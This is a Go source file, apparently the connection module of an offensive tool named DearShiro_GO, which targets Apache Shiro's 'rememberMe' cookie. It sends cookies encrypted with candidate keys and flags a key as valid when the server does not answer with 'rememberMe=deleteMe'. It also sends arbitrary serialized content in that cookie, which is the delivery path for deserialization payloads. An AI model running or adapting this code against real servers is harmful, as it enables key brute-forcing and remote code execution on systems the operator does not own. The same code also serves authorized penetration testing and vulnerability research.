package conn

import (
	"DearShiro_GO/core/data"
	"DearShiro_GO/core/util"
	"encoding/hex"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
)

type Connection struct {
	BaseUrl *url.URL
}

func NewConnection(baseUrlString string) *Connection {
	baseUrl, err := url.Parse(baseUrlString)
	if err != nil {
		fmt.Fprintln(os.Stderr, "fetch: url parse error")
		return nil
	}
	return &Connection{BaseUrl: baseUrl}
}

func (this *Connection) SendRememberMe(key []byte, content []byte) *http.Response {
	rememberMe, _ := util.GetRememberMe(key, content)

	header := &http.Header{}
	header.Add("Content-Type", "application/x-www-form-urlencoded")
	header.Add("Cookie", "rememberMe="+rememberMe)

	request := &http.Request{
		URL:    this.BaseUrl,
		Method: http.MethodGet,
		Header: *header,
	}

	client := new(http.Client)
	response, err := client.Do(request)
	if err != nil {
		fmt.Fprintln(os.Stderr, "fetch: some error appended during connection")
		//panic("fetch: some error appended during connection")
		return nil
	}
	return response
}

var reg, _ = regexp.Compile(".*rememberMe=deleteMe.*")
var buffer, _ = hex.DecodeString(data.SimplePrincipalCollectionHex)

func (this *Connection) CheckFalseKey(key []byte) bool {
	//rememberMe, _ := util.GetRememberMe(key, buffer)

	//header := &http.Header{}
	//header.Add("Content-Type", "application/x-www-form-urlencoded")
	//header.Add("Cookie", "rememberMe="+rememberMe)
	//
	//request := &http.Request{
	//	URL:    this.BaseUrl,
	//	Method: http.MethodGet,
	//	Header: *header,
	//}
	//
	//client := new(http.Client)
	//response, err := client.Do(request)
	//if err != nil {
	//	fmt.Fprintln(os.Stderr, "fetch: some error appended during connection")
	//	return true
	//}
	response := this.SendRememberMe(key, buffer)

	fmt.Println("[+]Test Key: " + string(key))
	fmt.Println("[-]Response Code: " + strconv.Itoa(response.StatusCode))

	return reg.MatchString(response.Header.Get("Set-Cookie"))
}

func (this *Connection) QueryRecord() *http.Response {
	request := &http.Request{
		URL:    this.BaseUrl,
		Method: http.MethodGet,
	}

	client := new(http.Client)
	response, err := client.Do(request)
	if err != nil {
		fmt.Fprintln(os.Stderr, "fetch: some error appended during connection")
		return nil
	}
	return response
}
